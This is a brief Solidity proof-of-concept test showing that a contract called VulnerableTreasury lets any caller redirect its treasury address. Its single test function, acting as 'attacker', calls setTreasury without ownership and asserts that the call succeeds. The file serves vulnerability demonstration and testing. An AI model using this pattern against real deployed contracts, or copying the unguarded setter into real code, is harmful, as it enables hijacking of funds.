// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/VulnerableTreasury.sol";

contract PoCTest {
    function testUnauthorizedSetTreasury() public {
        address owner = address(0xA11CE);
        address attacker = address(this);
        VulnerableTreasury treasury = new VulnerableTreasury(owner);

        treasury.setTreasury(attacker);

        assert(treasury.treasury() == attacker);
    }
}

